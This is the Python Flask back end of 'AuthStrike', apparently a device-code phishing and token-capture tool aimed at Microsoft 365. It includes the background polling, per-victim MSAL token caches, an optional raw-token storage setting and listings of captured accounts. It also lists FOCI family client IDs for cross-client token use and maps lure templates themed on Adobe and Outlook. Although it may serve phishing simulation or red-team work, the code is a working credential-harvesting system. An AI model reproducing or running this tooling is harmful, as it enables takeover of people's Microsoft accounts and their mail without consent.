from flask import Flask, jsonify, render_template, request, redirect, url_for, session, abort
from functools import wraps
import msal, os, requests
from dotenv import load_dotenv
from datetime import datetime, timedelta, timezone
import json
import base64
from werkzeug.security import check_password_hash
import threading
import time
import sys
import secrets
import sqlite3
from contextlib import contextmanager
from html.parser import HTMLParser
from urllib.parse import quote

# Load local .env when running directly (python3 app.py).
# In production, environment variables supplied by the process/container take precedence.
load_dotenv()

CACHE_FILE = "token_cache.bin"
COUNTER_FILE = "request_counter.json"
HISTORY_FILE = "devicecode_history.json"
TOKEN_HISTORY_FILE = "token_history.json"
RUNTIME_DIR = "runtime"
CACHE_DIR = os.path.join(RUNTIME_DIR, "caches")
STATE_DB_FILE = os.path.join(RUNTIME_DIR, "state.db")
os.makedirs(CACHE_DIR, exist_ok=True)
OPERATION_RESULTS = {}

# Microsoft Office
# MICROSOFT_OFFICE_CLIENT_ID2 = "d3590ed6-52b3-4102-aeff-aad2292ab01c"

# Azure PowerShell
# MICROSOFT_OFFICE_CLIENT_ID3 = "1950a258-227b-4e31-a9cf-717495945fc2"

# Azure CLI
# MICROSOFT_OFFICE_CLIENT_ID4 = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"

# Broker ID
MICROSOFT_OFFICE_CLIENT_ID = "29d9ed98-a469-4536-ade2-f981bc1d605e"
AUTHORITY = "https://login.microsoftonline.com/common"
FOCI_SCOPES = ["https://graph.microsoft.com/.default"]

CLIENT_PROFILES = [
    {"key": "broker", "name": "Microsoft Authentication Broker", "id": "29d9ed98-a469-4536-ade2-f981bc1d605e", "description": "Microsoft Authentication Broker public client.", "foci": False},
    {"key": "office", "name": "Microsoft Office", "id": "d3590ed6-52b3-4102-aeff-aad2292ab01c", "description": "Known FOCI family client.", "foci": True},
    {"key": "powershell", "name": "Azure PowerShell", "id": "1950a258-227b-4e31-a9cf-717495945fc2", "description": "Non-FOCI public client.", "foci": False},
    {"key": "azure_cli", "name": "Azure CLI", "id": "04b07795-8ddb-461a-bbee-02f9e1bf7b46", "description": "Non-FOCI public client.", "foci": False},
    {"key": "office365_management", "name": "Office 365 Management", "id": "00b41c95-dab0-4487-9791-b9d2c32c80f2", "description": "Known FOCI family client.", "foci": True},
    {"key": "outlook_mobile", "name": "Outlook Mobile", "id": "27922004-5251-4030-b22d-91ecd9a37ea4", "description": "Known FOCI family client.", "foci": True},
]
CLIENT_PROFILE_BY_KEY = {item["key"]: item for item in CLIENT_PROFILES}

RESOURCE_PROFILES = [
    {"key": "graph", "name": "Microsoft Graph", "scopes": ["https://graph.microsoft.com/.default"], "description": "Graph access token for identity, mailbox and directory APIs."},
    {"key": "outlook", "name": "Outlook / Exchange Online", "scopes": ["https://outlook.office.com/.default"], "description": "Outlook / Exchange Online resource token when the selected client and tenant permit it."},
]
RESOURCE_PROFILE_BY_KEY = {item["key"]: item for item in RESOURCE_PROFILES}
DEFAULT_TEMPLATE_CLIENTS = {
    "validation": "office",
    "adobe": "office",
    "outlook": "office",
    # Legacy routes remain configurable for backwards compatibility.
    "verify": "azure_cli",
    "secure": "powershell",
    "auth": "office",
}

def inspect_foci_cache(operation_id):
    """Return non-sensitive FOCI metadata from an operation MSAL cache.

    We never return or persist refresh-token material here. A cache can contain
    family_id metadata on refresh-token entries; that is enough to tell the
    operator whether MSAL has family-token material available for silent
    acquisition. Actual cross-client acquisition remains delegated to MSAL.
    """
    try:
        c = cache(operation_id)
        payload = json.loads(c.serialize() or "{}")
        refresh_entries = payload.get("RefreshToken", {}) if isinstance(payload, dict) else {}
        family_ids = sorted({
            str(entry.get("family_id"))
            for entry in refresh_entries.values()
            if isinstance(entry, dict) and entry.get("family_id")
        })
        return {"detected": bool(family_ids), "family_ids": family_ids, "refresh_token_managed": bool(refresh_entries)}
    except Exception:
        return {"detected": False, "family_ids": [], "refresh_token_managed": False}

def get_template_profile(template_key):
    mapping = session.get("template_clients", DEFAULT_TEMPLATE_CLIENTS)
    key = mapping.get(template_key, DEFAULT_TEMPLATE_CLIENTS.get(template_key, "broker"))
    return CLIENT_PROFILE_BY_KEY.get(key, CLIENT_PROFILE_BY_KEY["broker"])

def resolve_client_profile(profile_key, template_key=None):
    if profile_key and profile_key in CLIENT_PROFILE_BY_KEY:
        return CLIENT_PROFILE_BY_KEY[profile_key]
    if template_key:
        return get_template_profile(template_key)
    return CLIENT_PROFILE_BY_KEY["broker"]

app = Flask(__name__)
_secret_key = os.getenv("FLASK_SECRET_KEY")
if not _secret_key or len(_secret_key) < 32:
    raise RuntimeError("FLASK_SECRET_KEY must be set and contain at least 32 characters.")
app.secret_key = _secret_key
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    # Secure cookies must only be enabled when the operator UI is actually served over HTTPS.
    # For the current direct HTTP:5000 setup, keeping this true prevents the browser
    # from sending the Flask session cookie, which in turn causes CSRF validation to fail.
    SESSION_COOKIE_SECURE=os.getenv("AUTHSTRIKE_HTTPS", "false").lower() in {"1", "true", "yes"},
    MAX_CONTENT_LENGTH=1024 * 1024,
)

state_lock = threading.RLock()
operation_creation_lock = threading.Lock()


def _connect_state_db():
    conn = sqlite3.connect(STATE_DB_FILE, timeout=30, isolation_level=None)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA busy_timeout=30000")
    conn.execute("PRAGMA synchronous=FULL")
    conn.execute("CREATE TABLE IF NOT EXISTS app_state (key TEXT PRIMARY KEY, value TEXT NOT NULL)")
    conn.execute("""
        CREATE TABLE IF NOT EXISTS poll_jobs (
            operation_id INTEGER PRIMARY KEY,
            flow_json TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'PENDING',
            claimed_pid INTEGER,
            created_at TEXT NOT NULL,
            claimed_at TEXT,
            finished_at TEXT
        )
    """)
    return conn


def _read_legacy_json(path, default):
    try:
        with open(path, "r") as f:
            value = json.load(f)
        return value
    except (OSError, json.JSONDecodeError, TypeError):
        return default


def _initialize_state_db():
    conn = _connect_state_db()
    try:
        conn.execute("PRAGMA journal_mode=WAL")
        legacy = {
            "counter": _read_legacy_json(COUNTER_FILE, {"counter": 0}),
            "device_history": _read_legacy_json(HISTORY_FILE, []),
            "token_history": _read_legacy_json(TOKEN_HISTORY_FILE, []),
        }
        conn.execute("BEGIN IMMEDIATE")
        for key, value in legacy.items():
            exists = conn.execute("SELECT 1 FROM app_state WHERE key=?", (key,)).fetchone()
            if exists is None:
                conn.execute("INSERT INTO app_state(key,value) VALUES(?,?)", (key, json.dumps(value)))
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()


def _state_get(key, default):
    conn = _connect_state_db()
    try:
        row = conn.execute("SELECT value FROM app_state WHERE key=?", (key,)).fetchone()
        if row is None:
            return default
        try:
            return json.loads(row[0])
        except (TypeError, json.JSONDecodeError):
            return default
    finally:
        conn.close()


def _state_set(key, value):
    conn = _connect_state_db()
    try:
        conn.execute("BEGIN IMMEDIATE")
        conn.execute(
            "INSERT INTO app_state(key,value) VALUES(?,?) "
            "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
            (key, json.dumps(value)),
        )
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()


def _state_update_list(key, callback):
    conn = _connect_state_db()
    try:
        conn.execute("BEGIN IMMEDIATE")
        row = conn.execute("SELECT value FROM app_state WHERE key=?", (key,)).fetchone()
        if row is None:
            current = []
        else:
            try:
                current = json.loads(row[0])
            except (TypeError, json.JSONDecodeError):
                current = []
        result = callback(current)
        if isinstance(result, tuple) and len(result) == 2:
            updated, callback_result = result
        else:
            updated, callback_result = result, None
        conn.execute(
            "INSERT INTO app_state(key,value) VALUES(?,?) "
            "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
            (key, json.dumps(updated)),
        )
        conn.commit()
        return updated, callback_result
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()


def _state_reset():
    conn = _connect_state_db()
    try:
        conn.execute("BEGIN IMMEDIATE")
        for key, value in (("device_history", []), ("token_history", []), ("counter", {"counter": 0})):
            conn.execute(
                "INSERT INTO app_state(key,value) VALUES(?,?) "
                "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
                (key, json.dumps(value)),
            )
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()


def enqueue_poll_job(operation_id, flow):
    """Persist a device-code polling job so it survives Gunicorn worker restarts."""
    flow_json = json.dumps(flow)
    conn = _connect_state_db()
    try:
        conn.execute("BEGIN IMMEDIATE")
        existing = conn.execute("SELECT operation_id FROM poll_jobs WHERE operation_id=?", (operation_id,)).fetchone()
        if existing:
            conn.execute(
                "UPDATE poll_jobs SET flow_json=?, status='PENDING', claimed_pid=NULL, claimed_at=NULL, finished_at=NULL WHERE operation_id=?",
                (flow_json, operation_id),
            )
        else:
            conn.execute(
                "INSERT INTO poll_jobs(operation_id,flow_json,status,created_at) VALUES(?,?, 'PENDING',?)",
                (operation_id, flow_json, datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
            )
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()

def claim_poll_job():
    """Atomically claim one pending job, or one job owned by a dead process."""
    conn = _connect_state_db()
    try:
        conn.execute("BEGIN IMMEDIATE")
        rows = conn.execute(
            "SELECT operation_id, flow_json, status, claimed_pid FROM poll_jobs "
            "WHERE status='PENDING' OR status='RUNNING' ORDER BY operation_id"
        ).fetchall()
        selected = None
        for row in rows:
            if row[2] == 'PENDING' or (row[3] is not None and not _process_is_alive(row[3])):
                selected = row
                break
        if selected is None:
            conn.commit()
            return None
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        conn.execute(
            "UPDATE poll_jobs SET status='RUNNING', claimed_pid=?, claimed_at=? WHERE operation_id=?",
            (os.getpid(), now, selected[0]),
        )
        conn.commit()
        try:
            flow = json.loads(selected[1])
        except (TypeError, json.JSONDecodeError):
            flow = None
        return {"operation_id": selected[0], "flow": flow}
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()

def finish_poll_job(operation_id):
    conn = _connect_state_db()
    try:
        conn.execute("BEGIN IMMEDIATE")
        conn.execute(
            "UPDATE poll_jobs SET status='DONE', finished_at=?, claimed_pid=NULL WHERE operation_id=?",
            (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), operation_id),
        )
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()

def _process_poll_job(job):
    """Process one claimed polling job without blocking other queued jobs."""
    operation_id = job["operation_id"]
    flow = job.get("flow")
    history = get_device_code_history()
    entry = next((x for x in history if x.get("id") == operation_id), None)
    if not flow or not entry or entry.get("status") != "POLLING":
        finish_poll_job(operation_id)
        if entry and entry.get("status") == "POLLING":
            update_device_code_history(operation_id, status="INTERRUPTED", completed_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"), error="Polling job could not be resumed safely.")
        return
    update_device_code_history(operation_id, worker_pid=os.getpid())
    try:
        background_token_capture(flow, operation_id)
    finally:
        finish_poll_job(operation_id)

def dispatch_poll_jobs():
    """Process durable polling jobs concurrently, with a bounded worker pool."""
    from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED

    max_workers = 20
    futures = set()
    with ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="authstrike-poll-job") as executor:
        while True:
            try:
                # Reap completed jobs and surface unexpected worker exceptions.
                done = {future for future in futures if future.done()}
                for future in done:
                    futures.remove(future)
                    try:
                        future.result()
                    except Exception as exc:
                        print(f"[-] Polling job error: {exc}")

                # Fill available worker slots. Each job is claimed transactionally,
                # so multiple dispatcher processes cannot process the same operation.
                while len(futures) < max_workers:
                    job = claim_poll_job()
                    if not job:
                        break
                    futures.add(executor.submit(_process_poll_job, job))

                if futures:
                    # Wake when any active device flow completes, while allowing
                    # the loop to notice and fill newly available slots promptly.
                    wait(futures, timeout=0.5, return_when=FIRST_COMPLETED)
                else:
                    time.sleep(0.5)
            except Exception as exc:
                print(f"[-] Polling dispatcher error: {exc}")
                time.sleep(0.5)
            time.sleep(1)

@contextmanager
def _cache_file_lock(path, exclusive=False):
    lock_path = path + ".lock"
    lock_file = open(lock_path, "a+")
    try:
        try:
            import fcntl
            fcntl.flock(lock_file.fileno(), fcntl.LOCK_EX if exclusive else fcntl.LOCK_SH)
        except ImportError:
            pass
        yield
    finally:
        try:
            import fcntl
            fcntl.flock(lock_file.fileno(), fcntl.LOCK_UN)
        except ImportError:
            pass
        lock_file.close()



try:
    MSAL_CACHE_RETENTION_DAYS = max(1, int(os.getenv("MSAL_CACHE_RETENTION_DAYS", "30")))
except (TypeError, ValueError):
    MSAL_CACHE_RETENTION_DAYS = 30

def cleanup_msal_caches():
    """Conservatively remove stale operation MSAL caches.

    Safe-retention rules:
      - Never remove a cache for a currently POLLING operation.
      - Remove caches for terminal non-success operations older than retention.
      - For SUCCESS operations, remove only when no active token-history record
        remains and the operation completed more than retention days ago.
      - Remove orphaned operation cache files older than retention.
    """
    cutoff = datetime.now() - timedelta(days=MSAL_CACHE_RETENTION_DAYS)
    history = get_device_code_history()
    token_history = get_token_history()
    entries = {item.get("id"): item for item in history if item.get("id") is not None}
    active_token_ops = {
        item.get("operation_id")
        for item in token_history
        if item.get("operation_id") is not None and token_record_is_active(item)
    }

    def parse_dt(*values):
        for value in values:
            if not value:
                continue
            try:
                return datetime.strptime(value, "%Y-%m-%d %H:%M:%S")
            except (TypeError, ValueError):
                continue
        return None

    cleanup_lock = os.path.join(RUNTIME_DIR, "msal-cache-cleanup.lock")
    os.makedirs(RUNTIME_DIR, exist_ok=True)
    with _cache_file_lock(cleanup_lock, exclusive=True):
        try:
            names = os.listdir(CACHE_DIR)
        except OSError:
            return 0

        removed = 0
        for name in names:
            if not name.startswith("operation_") or not name.endswith(".bin"):
                continue
            try:
                operation_id = int(name[len("operation_"):-len(".bin")])
            except ValueError:
                continue

            path = os.path.join(CACHE_DIR, name)
            entry = entries.get(operation_id)
            should_remove = False

            if entry is None:
                try:
                    should_remove = datetime.fromtimestamp(os.path.getmtime(path)) < cutoff
                except OSError:
                    continue
            else:
                status = str(entry.get("status") or "").upper()
                finished_at = parse_dt(entry.get("completed_at"), entry.get("generated_at"))
                old_enough = bool(finished_at and finished_at < cutoff)

                if status in {"EXPIRED", "INTERRUPTED", "DECLINED", "ERROR", "FAILED", "CANCELLED"}:
                    should_remove = old_enough
                elif status == "SUCCESS":
                    # Preserve successful caches while any currently active token
                    # exists; this keeps refresh/Graph/mailbox recovery intact.
                    should_remove = old_enough and operation_id not in active_token_ops

            if should_remove:
                try:
                    os.remove(path)
                    removed += 1
                except FileNotFoundError:
                    pass
                except OSError:
                    continue
                lock_path = path + ".lock"
                try:
                    os.remove(lock_path)
                except (FileNotFoundError, OSError):
                    pass
        return removed

_initialize_state_db()

@app.after_request
def add_security_headers(response):
    response.headers.setdefault("X-Content-Type-Options", "nosniff")
    response.headers.setdefault("X-Frame-Options", "SAMEORIGIN")
    response.headers.setdefault("Referrer-Policy", "no-referrer")
    response.headers.setdefault("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
    if request.endpoint in {"t", "r", "me", "outlook_page", "outlook_authenticate", "operator_notifications", "operation_outlook_status", "d", "adobe_simulation", "outlook_simulation"}:
        response.headers["Cache-Control"] = "no-store"
    return response

def csrf_token():
    token = session.get("csrf_token")
    if not token:
        token = os.urandom(24).hex()
        session["csrf_token"] = token
    return token

@app.context_processor
def inject_security_context():
    return {"csrf_token": csrf_token(), "current_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

def require_csrf():
    supplied = request.form.get("csrf_token") or request.headers.get("X-CSRF-Token")
    if not supplied or supplied != session.get("csrf_token"):
        abort(400, description="Invalid CSRF token.")

def configured_admin_password_hash():
    value = os.getenv("AUTHSTRIKE_ADMIN_PASSWORD_HASH")
    if not value:
        raise RuntimeError("AUTHSTRIKE_ADMIN_PASSWORD_HASH is not configured.")
    return value

def get_configured_client_id():
    if session.get("client_id"):
        return session["client_id"]
    return resolve_client_profile(session.get("client_profile"), "default").get("id") or os.getenv("MICROSOFT_CLIENT_ID") or MICROSOFT_OFFICE_CLIENT_ID

def cache(operation_id=None):
    c = msal.SerializableTokenCache()
    path = os.path.join(CACHE_DIR, f"operation_{operation_id}.bin") if operation_id else CACHE_FILE
    if os.path.exists(path):
        with _cache_file_lock(path, exclusive=False), open(path, "r") as f:
            c.deserialize(f.read())
    return c

def save(c, operation_id=None):
    if not c.has_state_changed:
        return
    path = os.path.join(CACHE_DIR, f"operation_{operation_id}.bin") if operation_id else CACHE_FILE
    directory = os.path.dirname(path) or "."
    os.makedirs(directory, exist_ok=True)
    serialized = c.serialize()
    with _cache_file_lock(path, exclusive=True):
        temp_path = f"{path}.{os.getpid()}.{secrets.token_hex(6)}.tmp"
        try:
            with open(temp_path, "w") as f:
                f.write(serialized)
                f.flush()
                os.fsync(f.fileno())
            os.replace(temp_path, path)
        finally:
            try:
                os.remove(temp_path)
            except FileNotFoundError:
                pass

def get_next_request_id():
    conn = _connect_state_db()
    try:
        conn.execute("BEGIN IMMEDIATE")
        row = conn.execute("SELECT value FROM app_state WHERE key='counter'").fetchone()
        try:
            current = json.loads(row[0]) if row else {"counter": 0}
            current_counter = int(current.get("counter", 0))
        except (TypeError, ValueError, json.JSONDecodeError):
            current_counter = 0
        request_id = current_counter + 1
        conn.execute(
            "INSERT INTO app_state(key,value) VALUES('counter',?) "
            "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
            (json.dumps({"counter": request_id}),),
        )
        conn.commit()
        return request_id
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()

def save_device_code_history(request_id, user_code, client_id, generated_time, expires_at):
    def add(history):
        history.append({
            "id": request_id,
            "user_code": user_code,
            "client_id": client_id,
            "generated_at": generated_time,
            "expires_at": expires_at,
            "last_polled_at": generated_time,
            "status": "POLLING",
            "worker_pid": os.getpid()
        })
        return history
    _state_update_list("device_history", add)

def update_device_code_history(entry_id, **changes):
    found = None
    def update(history):
        nonlocal found
        for item in history:
            if item.get("id") == entry_id:
                item.update(changes)
                found = dict(item)
                break
        return history
    _state_update_list("device_history", update)
    return found

def get_device_code_history():
    value = _state_get("device_history", [])
    return value if isinstance(value, list) else []

def _process_is_alive(pid):
    """Return whether a recorded worker process still exists."""
    try:
        pid = int(pid)
    except (TypeError, ValueError):
        return False
    if pid <= 0:
        return False
    if pid == os.getpid():
        return True
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    except PermissionError:
        return True
    except OSError:
        return False
    return True

def _poll_job_state(operation_id):
    """Return the durable polling job state for an operation, or None if absent."""
    if operation_id is None:
        return None
    conn = _connect_state_db()
    try:
        row = conn.execute("SELECT status, claimed_pid FROM poll_jobs WHERE operation_id=?", (operation_id,)).fetchone()
        if row is None:
            return None
        return {"status": row[0], "claimed_pid": row[1]}
    finally:
        conn.close()

def reconcile_device_code_history(history=None):
    """Normalize stale POLLING entries, including flows left behind by a server restart."""
    now = datetime.now()
    def reconcile(current):
        changed = False
        for item in current:
            if item.get("status") != "POLLING":
                continue
            expires_at = item.get("expires_at")
            expiry = None
            if expires_at:
                try:
                    expiry = datetime.strptime(expires_at, "%Y-%m-%d %H:%M:%S")
                except (TypeError, ValueError):
                    expiry = None
            worker_pid = item.get("worker_pid")
            worker_stopped = worker_pid is not None and not _process_is_alive(worker_pid)
            durable_job = _poll_job_state(item.get("id"))
            if expiry is not None and now >= expiry:
                item["status"] = "EXPIRED"
                item.setdefault("completed_at", now.strftime("%Y-%m-%d %H:%M:%S"))
                item.setdefault("error", "The device-code authentication window expired before authentication completed.")
                changed = True
                continue
            if worker_stopped and durable_job is None:
                item["status"] = "INTERRUPTED"
                item.setdefault("completed_at", now.strftime("%Y-%m-%d %H:%M:%S"))
                item.setdefault("error", "Polling stopped because the process handling this device-code flow is no longer running.")
                changed = True
        return current
    if history is not None:
        # Explicit history is treated as a read-only snapshot; callers that need
        # persistence go through the shared state transaction below.
        result = reconcile([dict(item) for item in history])
        return result
    updated, _ = _state_update_list("device_history", reconcile)
    return updated

def operation_token_is_active(item, result):
    result = result or {}
    expires_at = parse_local_datetime(result.get("expires_at"))
    if expires_at:
        return datetime.now() < expires_at
    acquired_at = parse_local_datetime(result.get("acquired_at"))
    expires_in = result.get("expires_in")
    if acquired_at and isinstance(expires_in, (int, float)):
        return datetime.now() < (acquired_at + timedelta(seconds=expires_in))
    operation_id = item.get("id") if item else None
    latest = None
    if operation_id:
        for record in reversed(get_token_history()):
            if record.get("operation_id") == operation_id:
                latest = record
                break
    if latest and token_expiry(latest):
        return datetime.now() < token_expiry(latest)
    completed = parse_local_datetime(item.get("completed_at")) or parse_local_datetime(item.get("generated_at")) if item else None
    if not completed or not isinstance(expires_in, (int, float)):
        return True
    return datetime.now() < (completed + timedelta(seconds=expires_in))

def decode_access_token_metadata(access_token):
    """Best-effort, non-verifying decode of JWT access-token claims for display only.

    Access tokens are not accepted as authentic based on these decoded claims;
    Graph/MSAL responses remain the source of truth for authorization. This helper
    only fills display metadata when MSAL did not return equivalent fields.
    """
    if not access_token or access_token.count(".") != 2:
        return {}
    try:
        payload = access_token.split(".", 2)[1]
        payload += "=" * (-len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload.encode("ascii")).decode("utf-8"))
    except (ValueError, UnicodeDecodeError, json.JSONDecodeError):
        return {}


def recover_operation_result(operation_id, entry=None):
    """Recover the latest silent MSAL result for an operation after a process restart.

    OPERATION_RESULTS is an in-memory convenience cache. The durable source of
    authentication state is the operation-specific MSAL cache, so the operator
    UI can still work after Flask/Gunicorn restarts without requiring tokens to
    be written to token_history.json.
    """
    if not operation_id:
        return None
    current = OPERATION_RESULTS.get(operation_id) or {}
    if current.get("access_token") or current.get("id_token"):
        return current

    if entry is None:
        entry = next((x for x in reconcile_device_code_history() if x.get("id") == operation_id), None)
    if not entry or entry.get("status") != "SUCCESS":
        return None

    try:
        token_cache = cache(operation_id)
        client_id = entry.get("client_id") or MICROSOFT_OFFICE_CLIENT_ID
        application = client(token_cache, client_id)
        accounts = application.get_accounts()
        if not accounts:
            return None
        result = application.acquire_token_silent(FOCI_SCOPES, account=accounts[0]) or {}
        if result.get("access_token") or result.get("id_token"):
            merged = dict(current)
            merged.update(result)
            OPERATION_RESULTS[operation_id] = merged
            save(token_cache, operation_id)
            return merged
    except Exception:
        return None
    return None

def get_successful_operation_tokens():
    """Return successful operations whose access tokens are still active.

    Use token_history metadata for the selector so the page remains fast and
    continues to work after a process restart. The actual bearer token is only
    recovered from the operation's MSAL cache after the operator selects it.
    """
    history = reconcile_device_code_history()
    entries = {item.get("id"): item for item in history}
    results = []
    seen = set()
    for token_record in reversed(get_active_token_history()):
        operation_id = token_record.get("operation_id")
        if not operation_id or operation_id in seen:
            continue
        entry = entries.get(operation_id)
        if not entry or entry.get("status") != "SUCCESS":
            continue
        seen.add(operation_id)
        results.append({
            "id": operation_id,
            "username": token_record.get("username") or entry.get("username") or "Unknown account",
            "client_name": entry.get("client_name") or entry.get("client_id") or "Unknown client",
            "completed_at": entry.get("completed_at") or token_record.get("captured_at") or entry.get("generated_at") or "",
            "expires_in": token_record.get("expires_in"),
        })
    return results

def delete_device_code_entry(entry_id):
    def remove(history):
        return ([entry for entry in history if entry.get("id") != entry_id], None)
    before = get_device_code_history()
    after, _ = _state_update_list("device_history", remove)
    return len(after) != len(before)

def get_token_history():
    value = _state_get("token_history", [])
    return value if isinstance(value, list) else []

def parse_local_datetime(value):
    if not value:
        return None
    try:
        return datetime.strptime(value, "%Y-%m-%d %H:%M:%S")
    except (TypeError, ValueError):
        return None

def token_expiry(token_record):
    expires_at = parse_local_datetime(token_record.get("expires_at"))
    if expires_at:
        return expires_at
    captured = parse_local_datetime(token_record.get("captured_at"))
    expires_in = token_record.get("expires_in")
    if captured and isinstance(expires_in, (int, float)):
        return captured + timedelta(seconds=expires_in)
    return None

def token_record_is_active(token_record):
    expiry = token_expiry(token_record)
    return bool(expiry and datetime.now() < expiry)

def get_active_token_history():
    return [item for item in get_token_history() if token_record_is_active(item)]

def get_active_token_records():
    """Return every currently active token-history record with display metadata.

    Unlike get_successful_operation_tokens(), this intentionally does not
    deduplicate by operation_id. A single operation can produce additional
    active token records after a refresh for another client/resource.

    Older token-history records may not contain client_name/client_id, so the
    operation history is used as a read-only fallback for display.
    """
    history = get_token_history()
    operation_history = {
        item.get("id"): item
        for item in reconcile_device_code_history()
        if item.get("id") is not None
    }
    records = []
    for index, item in enumerate(history):
        if token_record_is_active(item):
            record = dict(item)
            operation = operation_history.get(item.get("operation_id"), {})
            client_id = record.get("client_id") or record.get("refresh_client_id") or operation.get("client_id")
            client_name = record.get("client_name") or record.get("refresh_client_name") or operation.get("client_name")
            if not client_name and client_id:
                profile = next((p for p in CLIENT_PROFILES if p.get("id") == client_id), None)
                client_name = profile.get("name") if profile else client_id
            record["client_id"] = client_id
            record["client_name"] = client_name or "Unknown client"
            record["history_index"] = index
            records.append(record)
    records.reverse()
    return records

def delete_token_history_entry(record_index):
    """Remove one token-history record from the AuthStrike workspace.

    This removes the record from the application's token list/archive; it
    does not revoke an already-issued Microsoft access token.
    """
    def remove(history):
        if not isinstance(history, list) or record_index < 0 or record_index >= len(history):
            return (history, False)
        history.pop(record_index)
        return (history, True)
    _, removed = _state_update_list("token_history", remove)
    return bool(removed)

def get_active_accounts():
    history = reconcile_device_code_history()
    # An account is considered active only when its successful operation still
    # has at least one active token record in the token workspace. This keeps
    # Accounts consistent with the operator's token deletion/archive actions.
    active_token_operation_ids = {
        record.get("operation_id")
        for record in get_active_token_history()
        if record.get("operation_id") is not None
    }
    accounts = []
    seen = set()
    for item in reversed(history):
        operation_id = item.get("id")
        if item.get("status") != "SUCCESS":
            continue
        if operation_id not in active_token_operation_ids:
            continue
        result = recover_operation_result(operation_id, item) or {}
        if not result.get("access_token") or not operation_token_is_active(item, result):
            continue

        # Prefer ID-token claims when available, but fall back to the access-token
        # claims for operations where MSAL did not return ID-token metadata. This
        # keeps otherwise valid active accounts from disappearing from the list.
        id_claims = result.get("id_token_claims") or {}
        access_claims = decode_access_token_metadata(result.get("access_token"))
        username = (
            id_claims.get("preferred_username")
            or id_claims.get("upn")
            or id_claims.get("email")
            or access_claims.get("preferred_username")
            or access_claims.get("upn")
            or access_claims.get("email")
        )
        tenant = id_claims.get("tid") or access_claims.get("tid") or "—"
        if not username:
            continue

        # Deduplicate actual account identities, not just usernames. The tenant is
        # part of the identity so the same local name in two tenants remains visible.
        account_key = (username.lower(), tenant.lower() if isinstance(tenant, str) else tenant)
        if account_key in seen:
            continue
        seen.add(account_key)

        display_name = id_claims.get("name") or access_claims.get("name") or username
        accounts.append({
            "operation_id": operation_id,
            "username": username,
            "display_name": display_name,
            "tenant": tenant,
            "client_name": item.get("client_name") or item.get("client_id") or "Unknown client",
            "completed_at": item.get("completed_at") or item.get("generated_at") or "",
            "expires_in": result.get("expires_in"),
        })
    return accounts

_initialize_state_db()
cleanup_msal_caches()

def save_token_history(token_result, operation_id=None):
    # Do not save if there is no valid access token
    if not token_result or "access_token" not in token_result:
        return

    claims = token_result.get("id_token_claims", {})
    access_token = token_result.get("access_token")
    keep_raw = os.getenv("STORE_RAW_TOKENS", "false").lower() in {"1", "true", "yes"}
    captured_now = datetime.now()
    record = {
        "captured_at": captured_now.strftime("%Y-%m-%d %H:%M:%S"),
        "acquired_at": token_result.get("acquired_at") or captured_now.strftime("%Y-%m-%d %H:%M:%S"),
        "operation_id": operation_id,
        "username": claims.get("preferred_username"),
        "display_name": claims.get("name"),
        "tenant": claims.get("tid"),
        "expires_in": token_result.get("expires_in"),
        "expires_at": (captured_now + timedelta(seconds=token_result.get("expires_in") or 0)).strftime("%Y-%m-%d %H:%M:%S") if token_result.get("expires_in") else None,
        "scope": token_result.get("scope"),
        "id_token_claims": claims,
        "has_access_token": bool(access_token),
        "has_refresh_token": bool(token_result.get("refresh_token")),
        "has_id_token": bool(token_result.get("id_token")),
        "client_id": token_result.get("refresh_client_id") or token_result.get("client_id"),
        "client_name": token_result.get("refresh_client_name") or token_result.get("client_name"),
        "resource_key": token_result.get("refresh_resource_key"),
        "resource_name": token_result.get("refresh_resource_name"),
    }
    if keep_raw:
        record.update({
            "access_token": access_token,
            "refresh_token": token_result.get("refresh_token"),
            "id_token": token_result.get("id_token"),
        })

    def append(history):
        # Prevent duplicate records for the exact same access token when the raw
        # value is available. When raw storage is disabled, use operation/client/
        # resource/acquisition metadata to avoid immediate duplicate writes.
        if history:
            latest = history[-1]
            if keep_raw and latest.get("access_token") == access_token:
                return (history, False)
            if (not keep_raw and latest.get("operation_id") == operation_id
                    and latest.get("client_id") == record.get("client_id")
                    and latest.get("resource_key") == record.get("resource_key")
                    and latest.get("acquired_at") == record.get("acquired_at")):
                return (history, False)
        history.append(record)
        return (history, True)

    _, appended = _state_update_list("token_history", append)
    return bool(appended)

def background_token_capture(flow, request_id):
    try:
        c = cache(request_id)
        a = client(c, flow.get("client_id") or MICROSOFT_OFFICE_CLIENT_ID)
        result = a.acquire_token_by_device_flow(flow)
        save(c, request_id)
        if "access_token" in result:
            # A workspace reset may have removed this operation while the MSAL worker was blocked.
            # In that case, do not recreate token history after the reset.
            history_now = get_device_code_history()
            if not any(x.get("id") == request_id for x in history_now):
                print(f"[-] Ignoring late result for removed operation #{request_id}")
                return
            result["acquired_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            result["expires_at"] = (datetime.now() + timedelta(seconds=result.get("expires_in") or 0)).strftime("%Y-%m-%d %H:%M:%S") if result.get("expires_in") else None
            OPERATION_RESULTS[request_id] = result
            save_token_history(result, request_id)
